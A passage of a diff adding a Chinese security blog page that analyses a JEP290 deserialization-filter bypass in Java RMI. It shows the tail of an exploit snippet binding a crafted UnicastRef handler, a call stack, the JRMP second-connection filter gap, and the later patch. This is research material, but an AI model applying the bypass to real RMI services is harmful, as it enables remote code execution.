+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">UnicastRef</span><span class="w"> </span><span class="n">ref</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnicastRef</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">LiveRef</span><span class="p">(</span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">te</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RemoteObjectInvocationHandler</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RemoteObjectInvocationHandler</span><span class="p">(</span><span class="n">ref</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// lookup方法也可以，但需要手动模拟lookup方法的流程</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">registry</span><span class="p">.</span><span class="na">bind</span><span class="p">(</span><span class="s">&#34;pwn&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">handler</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><h3 id="简单流程分析">简单流程分析<a hidden class="anchor" aria-hidden="true" href="#简单流程分析">#</a></h3>
+<p>在原先<code>readOject</code>下面这里<code>var2.releaseInputStream();</code>会进行第二段通信利用</p>
+<p><img loading="lazy" src="images/image-20250116183504927.png" alt="image-20250116183504927"  />
+</p>
+<p>在<code>registerRefs</code>会得到<code>JRMP段服务地址</code>，这个值怎么初始化的后面会提到</p>
+<p><img loading="lazy" src="images/image-20250116183653984.png" alt="image-20250116183653984"  />
+</p>
+<p>这里lookup其实没干什么，只是封装了下我们的var0</p>
+<p><img loading="lazy" src="images/image-20250116184054361.png" alt="image-20250116184054361"  />
+</p>
+<p><img loading="lazy" src="images/image-20250117090443370.png" alt="image-20250117090443370"  />
+</p>
+<p>后续在<code>executeCall()</code>中<code>this.getInputStream();</code>建立<code>新的通讯</code>，然后将接收序列化数据执行<code>反序列化</code></p>
+<p><img loading="lazy" src="images/image-20250117092945164.png" alt="image-20250117092945164"  />
+</p>
+<p><img loading="lazy" src="images/image-20250116184555886.png" alt="image-20250116184555886"  />
+</p>
+<p>调用栈</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">executeCall</span><span class="p">:</span><span class="n">220</span><span class="p">,</span><span class="w"> </span><span class="n">StreamRemoteCall</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">transport</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">invoke</span><span class="p">:</span><span class="n">375</span><span class="p">,</span><span class="w"> </span><span class="n">UnicastRef</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">server</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">dirty</span><span class="p">:</span><span class="n">109</span><span class="p">,</span><span class="w"> </span><span class="n">DGCImpl_Stub</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">transport</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">makeDirtyCall</span><span class="p">:</span><span class="n">382</span><span class="p">,</span><span class="w"> </span><span class="n">DGCClient$EndpointEntry</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">transport</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">registerRefs</span><span class="p">:</span><span class="n">324</span><span class="p">,</span><span class="w"> </span><span class="n">DGCClient$EndpointEntry</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">transport</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">registerRefs</span><span class="p">:</span><span class="n">160</span><span class="p">,</span><span class="w"> </span><span class="n">DGCClient</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">transport</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">registerRefs</span><span class="p">:</span><span class="n">102</span><span class="p">,</span><span class="w"> </span><span class="n">ConnectionInputStream</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">transport</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">releaseInputStream</span><span class="p">:</span><span class="n">157</span><span class="p">,</span><span class="w"> </span><span class="n">StreamRemoteCall</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">transport</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">dispatch</span><span class="p">:</span><span class="n">80</span><span class="p">,</span><span class="w"> </span><span class="n">RegistryImpl_Skel</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">registry</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">oldDispatch</span><span class="p">:</span><span class="n">468</span><span class="p">,</span><span class="w"> </span><span class="n">UnicastServerRef</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">server</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">dispatch</span><span class="p">:</span><span class="n">300</span><span class="p">,</span><span class="w"> </span><span class="n">UnicastServerRef</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">server</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></div><h4 id="tcpendpointjrmp段地址的赋值">TCPEndpoint（JRMP段地址）的赋值<a hidden class="anchor" aria-hidden="true" href="#tcpendpointjrmp段地址的赋值">#</a></h4>
+<p>他的<code>赋值</code>其实是在原先<code>反序列化利用点</code>开始的</p>
+<p><img loading="lazy" src="images/image-20250117091153045.png" alt="image-20250117091153045"  />
+</p>
+<p>我们设置的对象是专门继承<code>RemoteObject(继承Remote在白名单上)</code>的，到其的readObject，跟进<code>ref.readExternal(in);</code></p>
+<p><img loading="lazy" src="images/image-20250117091216556.png" alt="image-20250117091216556"  />
+</p>
+<p>跟进<code>LiveRef.read</code></p>
+<p><img loading="lazy" src="images/image-20250117091252179.png" alt="image-20250117091252179"  />
+</p>
+<p>这里会从<code>序列化数据</code>提取出<code>ip</code>和<code>port</code>，生成一个<code>TCPEndpoint</code>赋给<code>var2</code>，然后封装成一个<code>LiveRef</code>传到<code>var6.saveRef()</code>里</p>
+<p><img loading="lazy" src="images/image-20250117091505833.png" alt="image-20250117091505833"  />
+</p>
+<p><code>saveRef()</code>里最后存在到<code>incomingRefTable</code>这个table里面，可以回头看<code>利用分析</code>，就是从<code>这个变量</code>取的<code>对象</code></p>
+<p><img loading="lazy" src="images/image-20250117091528593.png" alt="image-20250117091528593"  />
+</p>
+<h3 id="2段通信--serialfilter"><strong>2段通信</strong> &amp; serialFilter<a hidden class="anchor" aria-hidden="true" href="#2段通信--serialfilter">#</a></h3>
+<p>这里有个点需要搞清楚关于<code>serialFilter</code></p>
+<p><strong>第一段通信</strong></p>
+<p>第一段通信，第一段通信是建立于<code>我们Server端bind()</code>,向<code>Register端</code>进行数据传输，记住这里的<code>ConnectionInputStream@982</code>编号，他的super的super既是<code>ObjectInputStream(存储serialFilter)</code></p>
+<p><img loading="lazy" src="images/image-20250116175215389.png" alt="image-20250116175215389"  />
+</p>
+<p>然后没有特别设置的话，<code>serialFilter</code>是为<code>null</code>的</p>
+<p><img loading="lazy" src="images/image-20250116175611151.png" alt="image-20250116175611151"  />
+</p>
+<p>第一段通信中，我们知道在<code>unmarshalCustomCallData()</code>中给<code>this.serialFilter</code>设置了值，注意这里编号<code>ConnectionInputStream@982</code></p>
+<p><img loading="lazy" src="images/image-20250116175749107.png" alt="image-20250116175749107"  />
+</p>
+<p><strong>第二段通信，JRMP协议</strong></p>
+<p>注意到<code>UnicastRef#invoke</code>=&gt;<code>executeCall()</code>=&gt;<code>this.getInputStream();</code>会建立<code>新的通信</code>，这里编号为<code>ConnectionInputStream@1160</code></p>
+<p><img loading="lazy" src="images/image-20250116180232622.png" alt="image-20250116180232622"  />
+</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">ObjectInput</span><span class="w"> </span><span class="nf">getInputStream</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">in</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Transport</span><span class="p">.</span><span class="na">transportLog</span><span class="p">.</span><span class="na">log</span><span class="p">(</span><span class="n">Log</span><span class="p">.</span><span class="na">VERBOSE</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;getting input stream&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="na">in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ConnectionInputStream</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">conn</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">in</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20250116180555439.png" alt="image-20250116180555439"  />
+</p>
+<p>进行初始化，所以这里<code>serialFilter</code>为<code>null</code>，并不存在第一段<code>通信设置的值</code></p>
+<p><img loading="lazy" src="images/image-20250116180932774.png" alt="image-20250116180932774"  />
+</p>
+<p>及<strong>反序列化的时候也不会存在检测</strong></p>
+<p><img loading="lazy" src="images/image-20250116181200490.png" alt="image-20250116181200490"  />
+</p>
+<p><img loading="lazy" src="images/image-20250116181059282.png" alt="image-20250116181059282"  />
+</p>
+<p><strong>小结:</strong></p>
+<blockquote>
+<p>这里我想表达什么呢，就是分清楚，这种方法<code>为什么可以绕过JEP290</code>，第一段通信是和<code>Server端</code>，第二段是和<code>JMRP端</code>。这里<code>ConnectionInputStream</code>其实就代表着<code>ObjectInputStream</code>，而第一段通信中设置的<code>serialFilter</code>只作用于第一段通信中，及只作用于<code>Register和Server之间的readObject中</code>！！（<code>JEP290作用域</code>）</p>
+</blockquote>
+<p>相信对上面的分析，对JEP290有比较清晰的理解了</p>
+<p><strong>修复：</strong></p>
+<p>在<code>dirty()</code>方法中<code>建立通讯</code>后，给<code>this.filter</code>设置了一个<code>JEP290</code>(表达式)</p>
+<p><img loading="lazy" src="images/image-20250117101356593.png" alt="image-20250117101356593"  />
+</p>
+<p>然后在<code>this.in</code>的<code>serialFilter</code>中设置上这个<code>filter</code></p>
+<p><img loading="lazy" src="images/image-20250117102416120.png" alt="image-20250117102416120"  />
+</p>
+<p>然后被检测出来</p>
+<p><img loading="lazy" src="images/image-20250117102758820.png" alt="image-20250117102758820"  />
+</p>
+<h2 id="bypass-8u2318u240">Bypass 8u231~8u240<a hidden class="anchor" aria-hidden="true" href="#bypass-8u2318u240">#</a></h2>
+<p>在8u231之前我们是通过<code>dirty()</code>这里绕过的，然后被修复了。8u231这里这是通过直接达到<code>UnicastRef#invoke</code>，不经过<code>dirty()</code>，仅靠第一次反序列化完成这些操作。但是下一个版本就被修了hhh，具体可以参考这篇https://www.anquanke.com/post/id/259059#h3-10</p>
+<p><strong>参考：</strong></p>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/8706?time__1311=n4%2BxnD0DcDu0eD5Y40HpDUhEIDkB711H4D#toc-8">https://xz.aliyun.com/t/8706?time__1311=n4%2BxnD0DcDu0eD5Y40HpDUhEIDkB711H4D#toc-8</a></p>
+<p><a href="https://www.anquanke.com/post/id/259059#h3-1">https://www.anquanke.com/post/id/259059#h3-1</a></p>
+</blockquote>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://Jiecub3.github.io/zh/posts/java/jndi/">
+    <span class="title">« 上一页</span>
+    <br>
+    <span>JNDI</span>
+  </a>
+  <a class="next" href="https://Jiecub3.github.io/zh/posts/java/chain/jdk17cc%E9%93%BE%E4%B8%8B%E5%88%A9%E7%94%A8templatesimpl/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>jdk17&amp;CC链下利用TemplatesImpl</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '复制';
+
+        function copyingDone() {
+            copybutton.innerHTML = '已复制！';
+            setTimeout(() => {
+                copybutton.innerHTML = '复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
